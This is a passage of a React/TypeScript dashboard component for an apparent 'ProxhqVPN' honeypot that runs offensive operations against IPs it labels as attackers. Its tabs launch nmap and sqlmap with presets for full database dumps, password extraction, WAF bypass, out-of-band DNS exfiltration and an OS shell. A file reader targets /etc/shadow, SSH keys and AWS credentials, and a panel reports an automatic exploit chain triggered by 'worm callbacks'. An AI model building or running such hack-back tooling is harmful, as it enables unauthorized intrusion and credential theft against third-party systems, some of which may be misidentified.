  }, [controlData?.autoExploitStatus, loadControlData]);

  const statusBadge = (s: string) => {
    const map: Record<string, string> = {
      idle: "text-primary/40", running: "text-yellow-400 animate-pulse",
      complete: "text-primary", error: "text-red-400",
    };
    return (
      <span className={`text-[10px] font-mono uppercase border px-1.5 py-0.5 rounded border-current ${map[s] ?? "text-primary/40"}`}>
        {s}
      </span>
    );
  };

  return (
    <div className="flex flex-col h-full">
      {/* Header */}
      <div className="flex items-center gap-3 p-3 border-b border-yellow-500/30 shrink-0 bg-yellow-500/5">
        <Bug className="w-4 h-4 text-yellow-400 shrink-0" />
        <div className="flex-1 min-w-0">
          <div className="font-bold text-yellow-400 font-mono text-sm">{attacker.ip}</div>
          <div className="text-[10px] text-primary/40 font-mono truncate">{attacker.fingerprint}</div>
        </div>
        <div className="flex items-center gap-2 text-[10px] text-primary/40 font-mono">
          {attacker.honeypotPort && (
            <span className="border border-yellow-500/30 text-yellow-400/70 px-1 rounded">honeypot:{attacker.honeypotPort}</span>
          )}
          <span>loops:{attacker.loopCount}</span>
          <span>{format(new Date(attacker.trappedAt), "HH:mm dd/MM")}</span>
        </div>
        <button onClick={onClose} className="text-primary/30 hover:text-white transition-colors ml-1 shrink-0">
          <XCircle className="w-4 h-4" />
        </button>
      </div>

      {/* Tab bar */}
      <div className="flex border-b border-yellow-500/20 shrink-0 overflow-x-auto [&::-webkit-scrollbar]:h-[3px] [&::-webkit-scrollbar-track]:bg-transparent [&::-webkit-scrollbar-thumb]:bg-primary/40 [&::-webkit-scrollbar-thumb]:rounded-full">
        {([
          { id: "portscan",  icon: Search,          label: "Port Scan",  color: "primary" },
          { id: "sqlmap",    icon: Syringe,         label: "Inject",     color: "red" },
          { id: "console",   icon: TerminalSquare,  label: "SQL Console",color: "orange" },
          { id: "files",     icon: FolderOpen,      label: "File Manager",color: "yellow" },
          { id: "osshell",   icon: Terminal,        label: "OS Shell",   color: "purple" },
          { id: "control",   icon: MonitorSmartphone, label: "Control Panel", color: "cyan" },
        ] as const).map(({ id, icon: Icon, label, color }) => {
          const colorMap: Record<string, string> = {
            primary: "border-primary text-primary bg-primary/5",
            red:     "border-red-500 text-red-400 bg-red-500/5",
            orange:  "border-orange-500 text-orange-400 bg-orange-500/5",
            yellow:  "border-yellow-500 text-yellow-400 bg-yellow-500/5",
            purple:  "border-purple-500 text-purple-400 bg-purple-500/5",
            cyan:    "border-cyan-500 text-cyan-400 bg-cyan-500/5",
          };
          const hoverMap: Record<string, string> = {
            primary: "hover:text-primary/70",
            red:     "hover:text-red-400/60",
            orange:  "hover:text-orange-400/60",
            yellow:  "hover:text-yellow-400/60",
            purple:  "hover:text-purple-400/60",
            cyan:    "hover:text-cyan-400/60",
          };
          return (
            <button
              key={id}
              onClick={() => switchTab(id)}
              className={`flex items-center gap-1.5 px-3 py-2.5 text-[10px] font-mono uppercase tracking-widest border-b-2 transition-colors whitespace-nowrap ${
                tab === id ? colorMap[color] : `border-transparent text-primary/40 ${hoverMap[color]}`
              }`}
            >
              <Icon className="w-3 h-3" />
              {label}
              {id === "sqlmap" && sqlStatus === "running" && <span className="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse" />}
              {id === "sqlmap" && sqlStatus === "complete" && <span className="w-1.5 h-1.5 rounded-full bg-primary" />}
              {id === "console" && consoleRunning && <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />}
              {id === "files"   && fileRunning   && <span className="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse" />}
              {id === "osshell" && osRunning     && <span className="w-1.5 h-1.5 rounded-full bg-purple-400 animate-pulse" />}
            </button>
          );
        })}
        <div className="ml-auto flex items-center px-3 shrink-0">
          <a
            href={`https://search.arin.net/rdap/?query=${attacker.ip}`}
            target="_blank" rel="noopener noreferrer"
            className="flex items-center gap-1.5 text-[10px] font-mono text-blue-400/60 hover:text-blue-400 transition-colors border border-blue-500/20 hover:border-blue-500/50 px-2 py-1 rounded"
          >
            <Globe className="w-3 h-3" />
            WHOIS
          </a>
        </div>
      </div>

      {/* Tab content */}
      <div className="flex-1 overflow-auto p-4">

        {/* ── PORT SCAN TAB ── */}
        {tab === "portscan" && (
          <div className="space-y-4">
            <div className="text-[10px] font-mono text-primary/40 border border-primary/10 rounded px-3 py-2 bg-primary/5">
              Runs <span className="text-primary">nmap</span> against <span className="text-primary">{attacker.ip}</span> to discover open ports, services, and software versions. Results can identify what the attacker is running on their machine.
            </div>

            <div className="flex flex-col sm:flex-row gap-3">
              <div className="flex-1">
                <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">Port Range</label>
                <input
                  value={scanPorts}
                  onChange={(e) => setScanPorts(e.target.value)}
                  className="w-full bg-black border border-primary/20 text-primary text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-primary/50 rounded"
                  placeholder="1-65535"
                />
              </div>
              <div className="flex-1">
                <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">Nmap Flags</label>
                <input
                  value={scanFlags}
                  onChange={(e) => setScanFlags(e.target.value)}
                  className="w-full bg-black border border-primary/20 text-primary text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-primary/50 rounded"
                  placeholder="-sV -T4"
                />
              </div>
            </div>

            {/* Quick flag presets */}
            <div className="flex flex-wrap gap-2">
              {[
                { label: "Fast Top 1000", flags: "-F -T4" },
                { label: "Service Detect", flags: "-sV -T4 -p 1-10000" },
                { label: "OS Detect", flags: "-O -sV -T4" },
                { label: "Full Scan", flags: "-sV -O -T4 -p 1-65535" },
                { label: "UDP Top 100", flags: "-sU --top-ports 100" },
                { label: "Stealth SYN", flags: "-sS -T2 -p 1-10000" },
              ].map(({ label, flags }) => (
                <button
                  key={label}
                  onClick={() => setScanFlags(flags)}
                  className="px-2 py-1 border border-primary/20 text-primary/60 text-[10px] font-mono hover:border-primary/50 hover:text-primary transition-colors rounded"
                >
                  {label}
                </button>
              ))}
            </div>

            <button
              onClick={runPortScan}
              disabled={scanning}
              className="flex items-center gap-2 px-4 py-2 border border-primary/40 text-primary text-xs font-mono uppercase hover:bg-primary/10 hover:border-primary transition-colors disabled:opacity-40 rounded"
            >
              {scanning ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Search className="w-3.5 h-3.5" />}
              {scanning ? `Scanning ${attacker.ip}…` : `Run Port Scan — ${attacker.ip}`}
            </button>

            {scanCmd && (
              <div className="text-[10px] font-mono text-primary/30 bg-black border border-primary/10 px-2 py-1.5 rounded">
                $ {scanCmd}
              </div>
            )}
            {scanOutput && (
              <div className="bg-black border border-primary/15 p-3 text-[11px] font-mono text-primary/75 max-h-96 overflow-auto whitespace-pre-wrap rounded">
                {scanOutput}
              </div>
            )}
          </div>
        )}

        {/* ── SQLMAP TAB ── */}
        {tab === "sqlmap" && (
          <div className="space-y-4">
            <div className="text-[10px] font-mono text-red-400/50 border border-red-500/15 rounded px-3 py-2 bg-red-500/5">
              Runs <span className="text-red-400">SQLmap</span> against a target URL associated with <span className="text-red-400">{attacker.ip}</span>. Use this to test for SQL injection vulnerabilities — results may expose the attacker's database and help identify them for law enforcement.
            </div>

            <div className="space-y-3">
              <div>
                <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">Target URL</label>
                <input
                  value={sqlTarget}
                  onChange={(e) => setSqlTarget(e.target.value)}
                  className="w-full bg-black border border-red-500/25 text-red-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-red-500/60 rounded"
                  placeholder={`http://${attacker.ip}/`}
                />
              </div>
              <div>
                <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">SQLmap Flags</label>
                <input
                  value={sqlFlags}
                  onChange={(e) => setSqlFlags(e.target.value)}
                  className="w-full bg-black border border-red-500/25 text-red-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-red-500/60 rounded"
                  placeholder="--dbs --forms --tables -D dbname"
                />
              </div>
            </div>

            {/* Preset quick-launch buttons */}
            <div>
              <div className="text-[10px] text-primary/40 font-mono uppercase mb-2">Quick Presets</div>
              <div className="grid grid-cols-2 gap-2">
                {[
                  { label: "Enumerate DBs",   flags: "--dbs",                                     desc: "List all databases" },
                  { label: "Dump Tables",     flags: "--tables --dbs",                             desc: "List all tables" },
                  { label: "Blind SQLi",      flags: "--technique=B --level=3 --risk=2",           desc: "Boolean-based blind" },
                  { label: "Time-Based",      flags: "--technique=T --level=3",                    desc: "Time-delay blind" },
                  { label: "Error-Based",     flags: "--technique=E --dbs",                        desc: "Error extraction" },
                  { label: "Full Dump",       flags: "--level=5 --risk=3 --dbs --tables --dump-all", desc: "Maximum extraction" },
                  { label: "Get Users",       flags: "--users --passwords",                        desc: "Extract DB credentials" },
                  { label: "OS Shell",        flags: "--os-shell",                                 desc: "Attempt OS command shell" },
                ].map(({ label, flags, desc }) => (
                  <button
                    key={label}
                    onClick={() => setSqlFlags(flags)}
                    className="flex flex-col items-start px-2.5 py-2 border border-red-500/20 text-left hover:border-red-500/50 hover:bg-red-500/5 transition-colors rounded"
                  >
                    <span className="text-red-400/80 text-[10px] font-mono font-semibold">{label}</span>
                    <span className="text-primary/30 text-[9px] font-mono">{desc}</span>
                  </button>
                ))}
              </div>
            </div>

            <div className="flex items-center gap-3">
              <button
                onClick={runSqlmap}
                disabled={sqlRunning}
                className="flex items-center gap-2 px-4 py-2 border border-red-500/50 text-red-400 text-xs font-mono uppercase hover:bg-red-500/10 hover:border-red-500 transition-colors disabled:opacity-40 rounded"
              >
                {sqlRunning ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Syringe className="w-3.5 h-3.5" />}
                {sqlRunning ? `SQLmap Running on ${attacker.ip}…` : `Launch SQLmap — ${attacker.ip}`}
              </button>
              <div className="flex items-center gap-2">
                {statusBadge(sqlStatus)}
                {sqlJobId && <span className="text-[10px] text-primary/30 font-mono">JOB:{sqlJobId}</span>}
              </div>
            </div>

            {sqlOutput && (
              <div className="bg-black border border-red-500/15 p-3 text-[11px] font-mono text-red-300/75 max-h-96 overflow-auto whitespace-pre-wrap rounded">
                {sqlOutput}
              </div>
            )}
            {sqlStatus === "running" && !sqlOutput && (
              <div className="flex items-center gap-2 text-yellow-400 text-xs font-mono border border-yellow-500/20 rounded px-3 py-2">
                <Loader2 className="w-3.5 h-3.5 animate-spin" />
                SQLmap scanning {attacker.ip} — polling every 4s for results…
              </div>
            )}
          </div>
        )}

        {/* ── SQL CONSOLE TAB ── */}
        {tab === "console" && (
          <div className="space-y-4">
            <div className="text-[10px] font-mono text-orange-400/60 border border-orange-500/15 rounded px-3 py-2 bg-orange-500/5">
              Full SQLmap console — runs <span className="text-orange-400">sqlmap -u "{sqlTarget}" --batch [your flags]</span>. Any SQLmap flag is supported.
            </div>

            <div>
              <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">Target URL (shared with Inject tab)</label>
              <input value={sqlTarget} onChange={e => setSqlTarget(e.target.value)}
                className="w-full bg-black border border-orange-500/25 text-orange-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-orange-500/60 rounded"
                placeholder={`http://${attacker.ip}/`} />
            </div>

            <div>
              <label className="text-[10px] text-primary/50 font-mono uppercase block mb-1">SQLmap Flags (full control)</label>
              <textarea value={consoleFlags} onChange={e => setConsoleFlags(e.target.value)} rows={4}
                className="w-full bg-black border border-orange-500/25 text-orange-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-orange-500/60 rounded resize-y"
                placeholder="--level=5 --risk=3 --dbs --dump-all --users --passwords" />
            </div>

            <div className="grid grid-cols-2 gap-2">
              {[
                { label: "Full Dump",          flags: "--level=5 --risk=3 --dbs --tables --dump-all" },
                { label: "Credentials",        flags: "--users --passwords --privilege" },
                { label: "Blind + Error",      flags: "--technique=BE --level=4 --risk=3 --dbs" },
                { label: "WAF Bypass",         flags: "--tamper=space2comment,between --random-agent --level=3" },
                { label: "Stacked Queries",    flags: "--technique=S --level=3 --risk=2 --dbs" },
                { label: "Second Order",       flags: "--second-url=http://"+attacker.ip+"/profile --dbs" },
                { label: "Banner + Version",   flags: "--banner --current-db --current-user --hostname --dbs" },
                { label: "OOB (DNS)",          flags: "--dns-domain=oob.proxhqvpn.com --dbs --level=3" },
              ].map(({ label, flags }) => (
                <button key={label} onClick={() => setConsoleFlags(flags)}
                  className="flex flex-col items-start px-2.5 py-2 border border-orange-500/20 text-left hover:border-orange-500/50 hover:bg-orange-500/5 transition-colors rounded">
                  <span className="text-orange-400/80 text-[10px] font-mono font-semibold">{label}</span>
                </button>
              ))}
            </div>

            <div className="flex items-center gap-3">
              <button onClick={runConsole} disabled={consoleRunning}
                className="flex items-center gap-2 px-4 py-2 border border-orange-500/50 text-orange-400 text-xs font-mono uppercase hover:bg-orange-500/10 hover:border-orange-500 transition-colors disabled:opacity-40 rounded">
                {consoleRunning ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <TerminalSquare className="w-3.5 h-3.5" />}
                {consoleRunning ? "Running…" : "Execute Command"}
              </button>
              {consoleJobId && <span className="text-[10px] text-primary/30 font-mono">JOB:{consoleJobId}</span>}
            </div>

            {consoleCmd && (
              <div className="text-[10px] font-mono text-orange-400/30 bg-black border border-orange-500/10 px-2 py-1.5 rounded overflow-x-auto whitespace-nowrap">
                $ {consoleCmd}
              </div>
            )}
            {consoleOutput && (
              <div className="relative">
                <div className="bg-black border border-orange-500/15 p-3 text-[11px] font-mono text-orange-300/75 max-h-[32rem] overflow-auto whitespace-pre-wrap rounded">
                  {consoleOutput}
                </div>
                <button onClick={() => { const b = new Blob([consoleOutput], { type: "text/plain" }); const u = URL.createObjectURL(b); const a = document.createElement("a"); a.href = u; a.download = `sqlmap-console-${attacker.ip}.txt`; a.click(); URL.revokeObjectURL(u); }}
                  className="absolute top-2 right-2 flex items-center gap-1 px-2 py-1 border border-orange-500/30 text-orange-400/60 text-[9px] font-mono hover:text-orange-400 hover:border-orange-500/60 rounded bg-black">
                  <Download className="w-3 h-3" /> Save
                </button>
              </div>
            )}
          </div>
        )}

        {/* ── FILE MANAGER TAB ── */}
        {tab === "files" && (
          <div className="space-y-4">
            <div className="text-[10px] font-mono text-yellow-400/60 border border-yellow-500/15 rounded px-3 py-2 bg-yellow-500/5">
              Reads files from the attacker's system via <span className="text-yellow-400">sqlmap --file-read</span>. Requires SQLi to be exploitable on the target.
            </div>

            <div className="flex gap-2">
              <input value={filePath} onChange={e => setFilePath(e.target.value)}
                className="flex-1 bg-black border border-yellow-500/25 text-yellow-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-yellow-500/60 rounded"
                placeholder="/etc/passwd" />
              <button onClick={() => runFileRead()} disabled={fileRunning}
                className="flex items-center gap-2 px-4 py-1.5 border border-yellow-500/50 text-yellow-400 text-xs font-mono hover:bg-yellow-500/10 hover:border-yellow-500 transition-colors disabled:opacity-40 rounded">
                {fileRunning ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <FolderOpen className="w-3.5 h-3.5" />}
                {fileRunning ? "Reading…" : "Read File"}
              </button>
            </div>

            <div>
              <div className="text-[10px] text-primary/40 font-mono uppercase mb-2">Linux Quick Access</div>
              <div className="flex flex-wrap gap-1.5">
                {["/etc/passwd","/etc/shadow","/etc/hosts","/etc/crontab","/root/.ssh/id_rsa",
                  "/root/.ssh/authorized_keys","/root/.bash_history","/home/ubuntu/.bash_history",
                  "/proc/version","/etc/issue","/var/log/auth.log","/etc/sudoers",
                  "/root/.aws/credentials","/home/ubuntu/.aws/credentials",
                ].map(p => (
                  <button key={p} onClick={() => runFileRead(p)} disabled={fileRunning}
                    className="px-2 py-0.5 border border-yellow-500/20 text-yellow-400/60 text-[9px] font-mono hover:border-yellow-500/50 hover:text-yellow-400 disabled:opacity-40 rounded transition-colors">
                    {p}
                  </button>
                ))}
              </div>
            </div>

            <div>
              <div className="text-[10px] text-primary/40 font-mono uppercase mb-2">Windows Quick Access</div>
              <div className="flex flex-wrap gap-1.5">
                {["C:\\Windows\\System32\\drivers\\etc\\hosts","C:\\Windows\\System32\\drivers\\etc\\networks",
                  "C:\\Users\\Administrator\\Desktop\\passwords.txt","C:\\inetpub\\wwwroot\\web.config",
                  "C:\\Windows\\win.ini","C:\\boot.ini",
                ].map(p => (
                  <button key={p} onClick={() => runFileRead(p)} disabled={fileRunning}
                    className="px-2 py-0.5 border border-yellow-500/20 text-yellow-400/60 text-[9px] font-mono hover:border-yellow-500/50 hover:text-yellow-400 disabled:opacity-40 rounded transition-colors">
                    {p}
                  </button>
                ))}
              </div>
            </div>

            {fileJobId && !fileOutput && fileRunning && (
              <div className="flex items-center gap-2 text-yellow-400 text-xs font-mono border border-yellow-500/20 rounded px-3 py-2">
                <Loader2 className="w-3.5 h-3.5 animate-spin" />
                Reading {filePath} via SQLi… polling every 4s
              </div>
            )}
            {fileOutput && (
              <div className="relative">
                <div className="flex items-center justify-between mb-1">
                  <span className="text-[10px] font-mono text-yellow-400/60">{filePath}</span>
                  <button onClick={downloadFileOutput}
                    className="flex items-center gap-1 px-2 py-0.5 border border-yellow-500/30 text-yellow-400/60 text-[9px] font-mono hover:text-yellow-400 rounded">
                    <Download className="w-3 h-3" /> Download
                  </button>
                </div>
                <div className="bg-black border border-yellow-500/15 p-3 text-[11px] font-mono text-yellow-200/75 max-h-96 overflow-auto whitespace-pre-wrap rounded">
                  {fileOutput}
                </div>
              </div>
            )}
          </div>
        )}

        {/* ── OS SHELL TAB ── */}
        {tab === "osshell" && (
          <div className="space-y-4">
            <div className="text-[10px] font-mono text-purple-400/60 border border-purple-500/15 rounded px-3 py-2 bg-purple-500/5">
              Executes OS commands on <span className="text-purple-400">{attacker.ip}</span> via <span className="text-purple-400">sqlmap --os-cmd</span>. Requires OS command execution capability through SQLi.
            </div>

            <div className="flex gap-2">
              <input value={osCmd} onChange={e => setOsCmd(e.target.value)}
                onKeyDown={e => { if (e.key === "Enter" && !osRunning) runOsCmd(); }}
                className="flex-1 bg-black border border-purple-500/25 text-purple-300 text-xs font-mono px-2 py-1.5 focus:outline-none focus:border-purple-500/60 rounded"
                placeholder="id && whoami && uname -a" />
              <button onClick={runOsCmd} disabled={osRunning}
                className="flex items-center gap-2 px-4 py-1.5 border border-purple-500/50 text-purple-400 text-xs font-mono hover:bg-purple-500/10 hover:border-purple-500 transition-colors disabled:opacity-40 rounded">
                {osRunning ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Terminal className="w-3.5 h-3.5" />}
                {osRunning ? "Running…" : "Execute"}
              </button>
            </div>

            <div className="flex flex-wrap gap-1.5">
              {["id && whoami && hostname","uname -a","cat /etc/passwd","cat /etc/shadow","ps aux | head -30",
                "netstat -tulpn","ls -la /root","cat /root/.bash_history","env","crontab -l",
                "find / -perm -4000 -type f 2>/dev/null","ss -tulpn","w","last -20",
                "iptables -L -n","cat /etc/crontab",
              ].map(cmd => (
                <button key={cmd} onClick={() => setOsCmd(cmd)}
                  className="px-2 py-0.5 border border-purple-500/20 text-purple-400/60 text-[9px] font-mono hover:border-purple-500/50 hover:text-purple-400 rounded transition-colors">
                  {cmd}
                </button>
              ))}
            </div>

            {osRunning && (
              <div className="flex items-center gap-2 text-purple-400 text-xs font-mono border border-purple-500/20 rounded px-3 py-2">
                <Loader2 className="w-3.5 h-3.5 animate-spin" />
                Executing OS command via SQLi — polling every 4s…
              </div>
            )}

            {/* Command history */}
            {osHistory.length > 0 && (
              <div className="space-y-2">
                <div className="text-[10px] text-primary/30 font-mono uppercase">Command History ({osHistory.length})</div>
                {osHistory.map((entry, i) => (
                  <div key={i} className="border border-purple-500/10 rounded overflow-hidden">
                    <div className="flex items-center gap-2 px-2 py-1 bg-purple-500/5 border-b border-purple-500/10">
                      <Terminal className="w-3 h-3 text-purple-400/50" />
                      <span className="text-[10px] font-mono text-purple-400/70 flex-1">{entry.cmd}</span>
                      <button onClick={() => setOsCmd(entry.cmd)} className="text-[9px] font-mono text-purple-400/40 hover:text-purple-400">re-run</button>
                    </div>
                    <div className="p-2 bg-black text-[11px] font-mono text-purple-200/60 max-h-32 overflow-auto whitespace-pre-wrap">
                      {entry.out.substring(0, 2000)}
                    </div>
                  </div>
                ))}
              </div>
            )}

            {osOutput && osHistory.length === 0 && (
              <div className="bg-black border border-purple-500/15 p-3 text-[11px] font-mono text-purple-300/75 max-h-96 overflow-auto whitespace-pre-wrap rounded">
                {osOutput}
              </div>
            )}
          </div>
        )}

        {/* ── CONTROL PANEL TAB ── */}
        {tab === "control" && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <div className="text-[10px] font-mono text-cyan-400/60 border border-cyan-500/15 rounded px-3 py-2 bg-cyan-500/5 flex-1 mr-3">
                Full intelligence dashboard for <span className="text-cyan-400">{attacker.ip}</span> — worm callbacks, request data, exploitation summary.
              </div>
              <button onClick={loadControlData} disabled={controlLoading}
                className="flex items-center gap-1.5 px-3 py-2 border border-cyan-500/30 text-cyan-400 text-[10px] font-mono hover:bg-cyan-500/10 hover:border-cyan-500/60 transition-colors disabled:opacity-40 rounded shrink-0">
                {controlLoading ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}
                Refresh
              </button>
            </div>

            {controlLoading && !controlData && (
              <div className="flex items-center gap-2 text-cyan-400 text-xs font-mono border border-cyan-500/20 rounded px-3 py-2">
                <Loader2 className="w-3.5 h-3.5 animate-spin" />Loading intelligence data…
              </div>
            )}

            {controlData && (
              <div className="space-y-3">

                {/* ── AUTO-EXPLOIT CHAIN STATUS ── */}
                {controlData.autoExploitStatus && (
                  <div className={`border rounded overflow-hidden ${
                    controlData.autoExploitStatus === "running"
                      ? "border-yellow-500/40 bg-yellow-500/5"
                      : controlData.autoExploitStatus === "complete"
                      ? "border-primary/30 bg-primary/5"
                      : "border-red-500/30 bg-red-500/5"
                  }`}>
                    <div className="px-3 py-2 flex items-center gap-2 text-[10px] font-mono uppercase tracking-widest">
                      {controlData.autoExploitStatus === "running" ? (
                        <><Loader2 className="w-3 h-3 animate-spin text-yellow-400" /><span className="text-yellow-400">Auto-Exploit Chain Running…</span></>
                      ) : controlData.autoExploitStatus === "complete" ? (
                        <><CheckCircle2 className="w-3 h-3 text-primary" /><span className="text-primary">Auto-Exploit Chain Complete</span></>
                      ) : (
                        <><AlertTriangle className="w-3 h-3 text-red-400" /><span className="text-red-400">Auto-Exploit Error</span></>
                      )}
                      {controlData.autoExploitIp && (
                        <span className="ml-auto text-white/40">TARGET: {controlData.autoExploitIp}</span>
                      )}
                    </div>
                    <div className="px-3 pb-2 text-[9px] font-mono text-white/40">
                      {controlData.autoExploitStatus === "running"
                        ? "Worm callhome received — nmap port scan + injection scan launched against real callback IP. Auto-refreshing…"
                        : `Started: ${controlData.autoExploitStartedAt ? new Date(controlData.autoExploitStartedAt).toLocaleString() : "—"} · Finished: ${controlData.autoExploitFinishedAt ? new Date(controlData.autoExploitFinishedAt).toLocaleString() : "—"}`
                      }
                    </div>
                  </div>
                )}

                {/* Auto-exploit nmap results */}
                {controlData.autoExploitNmap && (
                  <div className="border border-primary/20 rounded overflow-hidden">
                    <div className="px-3 py-2 bg-primary/10 text-[10px] font-mono text-primary uppercase tracking-widest flex items-center gap-2">
                      <Radio className="w-3 h-3" /> Auto Port Scan — {controlData.autoExploitIp}
                    </div>
                    <div className="p-3 bg-black text-[10px] font-mono text-primary/70 max-h-40 overflow-auto whitespace-pre-wrap">{controlData.autoExploitNmap}</div>
                  </div>
                )}

                {/* Auto-exploit injection results */}
                {controlData.autoExploitSqlmap && (
                  <div className="border border-orange-500/20 rounded overflow-hidden">
                    <div className="px-3 py-2 bg-orange-500/10 text-[10px] font-mono text-orange-400 uppercase tracking-widest flex items-center gap-2">
                      <Zap className="w-3 h-3" /> Auto Injection Scan — {controlData.autoExploitIp}
                    </div>
                    <div className="p-3 bg-black text-[10px] font-mono text-orange-300/60 max-h-48 overflow-auto whitespace-pre-wrap">{controlData.autoExploitSqlmap.substring(0, 4000)}</div>
                  </div>
                )}

                {/* Identity block */}
                <div className="border border-cyan-500/20 rounded overflow-hidden">
                  <div className="px-3 py-2 bg-cyan-500/10 text-[10px] font-mono text-cyan-400 uppercase tracking-widest">Target Identity</div>
                  <div className="p-3 grid grid-cols-2 gap-2 text-[11px] font-mono">
                    {[
                      ["Probe IP", attacker.ip],
                      ["Real Callback IP", controlData.autoExploitIp ?? "—"],
                      ["Region", controlData.nodeRegion ?? "Unknown"],
                      ["Honeypot Port", attacker.honeypotPort ?? "—"],
                      ["Probe Type", attacker.probeType ?? "—"],
                      ["Loop Count", controlData.loopCount?.toString() ?? "0"],
                    ].map(([k, v]) => (
                      <div key={k}>
                        <div className="text-primary/30 text-[9px] uppercase">{k}</div>
                        <div className="text-cyan-300">{v}</div>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Worm callbacks */}
                {controlData.wormCallbacks.length > 0 && (
                  <div className="border border-cyan-500/20 rounded overflow-hidden">
                    <div className="px-3 py-2 bg-cyan-500/10 text-[10px] font-mono text-cyan-400 uppercase tracking-widest flex items-center gap-2">
                      <span>Worm Callbacks</span>
                      <span className="border border-cyan-500/40 px-1.5 rounded text-cyan-300">{controlData.wormCallbacks.length}</span>
                    </div>
                    <div className="max-h-48 overflow-auto divide-y divide-cyan-500/10">
                      {controlData.wormCallbacks.map((cb, i) => (
                        <div key={i} className="px-3 py-2 space-y-1">
                          <div className="flex items-center gap-3 text-[9px] font-mono text-primary/40">
                            <span>{new Date(cb.ts).toLocaleString()}</span>
                            {cb.wormId && <span className="text-cyan-400/40">WORM:{cb.wormId}</span>}
                            {cb.callbackIp && <span className="text-yellow-400/60">IP:{cb.callbackIp}</span>}
                          </div>
                          {cb.ua && <div className="text-[10px] font-mono text-cyan-300/60 truncate">{cb.ua}</div>}
                          {cb.ref && <div className="text-[9px] font-mono text-cyan-400/40">ref: {cb.ref}</div>}
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* Raw request */}
                {controlData.rawRequest && (
                  <div className="border border-cyan-500/20 rounded overflow-hidden">
                    <div className="px-3 py-2 bg-cyan-500/10 text-[10px] font-mono text-cyan-400 uppercase tracking-widest">Captured Raw Request</div>
                    <div className="p-3 bg-black text-[10px] font-mono text-cyan-200/60 max-h-32 overflow-auto whitespace-pre-wrap">{controlData.rawRequest}</div>
                  </div>
                )}

                {/* Banner */}
                {controlData.banner && (
                  <div className="border border-cyan-500/20 rounded overflow-hidden">
                    <div className="px-3 py-2 bg-cyan-500/10 text-[10px] font-mono text-cyan-400 uppercase tracking-widest">Worm Banner Injected</div>
                    <div className="p-3 bg-black text-[10px] font-mono text-cyan-200/60 max-h-32 overflow-auto whitespace-pre-wrap">{controlData.banner}</div>
                  </div>
                )}

                {/* Manual SQLmap summary */}
                {controlData.sqlmapResults && (
                  <div className="border border-red-500/20 rounded overflow-hidden">
                    <div className="px-3 py-2 bg-red-500/10 text-[10px] font-mono text-red-400 uppercase tracking-widest flex items-center gap-2">
                      <FileText className="w-3 h-3" /> Manual Injection Results
                    </div>
                    <div className="p-3 bg-black text-[10px] font-mono text-red-300/60 max-h-48 overflow-auto whitespace-pre-wrap">{controlData.sqlmapResults.substring(0, 4000)}</div>
                  </div>
                )}

                {/* Open full HTML control window */}
                <button
                  onClick={() => {
                    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>ProxhqVPN — Control Panel: ${attacker.ip}</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#050505;color:#e0e0e0;font-family:monospace;font-size:12px}
  h1{color:#00ff88;font-size:18px;padding:16px;border-bottom:1px solid #00ff8820;background:#00ff8808}
  .banner{background:#0a1f0a;border-bottom:1px solid #00ff8820;padding:12px 16px;font-size:11px;color:#00ff8880}
  .row{display:flex;gap:0;border-bottom:1px solid #111}
  .cell{padding:8px 16px;flex:1;border-right:1px solid #111;overflow:auto}
  .label{color:#555;font-size:10px;text-transform:uppercase;margin-bottom:4px}
  .val{color:#00ff88}
  pre{white-space:pre-wrap;word-break:break-word;color:#aaa;font-size:11px;max-height:300px;overflow:auto}
  section{margin:16px;border:1px solid #0f0f0f;border-radius:4px;overflow:hidden}
  .sec-head{background:#111;color:#00ff88;padding:8px 12px;font-size:10px;text-transform:uppercase;letter-spacing:2px}
  .sec-head.orange{color:#f97316}
  .sec-head.yellow{color:#facc15}
  .callbacks{max-height:200px;overflow:auto}
  .cb{border-bottom:1px solid #0f0f0f;padding:8px 12px;font-size:10px}
  .cb .ts{color:#555}.cb .ua{color:#00dd77;margin-top:2px}.cb .rip{color:#facc15;margin-top:2px}
</style>
</head>
<body>
<h1>🕸️ ProxhqVPN — Attacker Control Panel: ${attacker.ip}</h1>
${controlData.autoExploitStatus ? `<div class="banner">Auto-Exploit Chain: <strong style="color:#00ff88">${controlData.autoExploitStatus.toUpperCase()}</strong> · Real IP: <strong style="color:#facc15">${controlData.autoExploitIp ?? "—"}</strong> · Job: ${controlData.autoExploitJobId ?? "—"}</div>` : ""}
<section>
<div class="sec-head">Identity</div>
<div class="row">
  <div class="cell"><div class="label">Probe IP</div><div class="val">${attacker.ip}</div></div>
  <div class="cell"><div class="label">Real Callback IP</div><div class="val" style="color:#facc15">${controlData.autoExploitIp ?? "—"}</div></div>
  <div class="cell"><div class="label">Region</div><div class="val">${controlData.nodeRegion ?? "Unknown"}</div></div>
  <div class="cell"><div class="label">Honeypot Port</div><div class="val">${attacker.honeypotPort ?? "—"}</div></div>
</div>
</section>
${controlData.autoExploitNmap ? `<section><div class="sec-head yellow">Auto Port Scan — ${controlData.autoExploitIp}</div><div style="padding:12px"><pre>${controlData.autoExploitNmap}</pre></div></section>` : ""}
